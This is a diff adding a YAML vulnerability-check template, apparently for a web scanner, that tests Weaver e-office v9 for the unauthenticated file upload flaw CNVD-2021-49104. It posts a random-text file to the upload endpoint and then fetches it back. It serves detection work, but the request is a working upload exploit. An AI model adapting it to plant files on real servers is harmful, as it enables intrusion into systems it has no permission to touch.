@@ -1,0 +1,22 @@
+name: e-office-v9-upload-cnvd-2021-49104
+set:
+  r1: randomLowercase(8)
+rules:
+  - method: POST
+    path: /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
+    headers:
+      Content-Type: multipart/form-data;boundary=e64bdf16c554bbc109cecef6451c26a4
+    body: |-
+      --e64bdf16c554bbc109cecef6451c26a4
+      Content-Disposition: form-data; name="Filedata"; filename="test.txt"
+      Content-Type: image/jpeg
+      {{r1}}
+      --e64bdf16c554bbc109cecef6451c26a4--
+    expression: response.status == 200  && response.body.bcontains(b"logo-eoffice")
+  - method: GET
+    path: /images/logo/logo-eoffice.txt
+    expression: response.status == 200 && response.body.bcontains(bytes(r1))
+detail:
+  author: szd790056181
+  links:
+    - http://www.ctfiot.com/13682.html
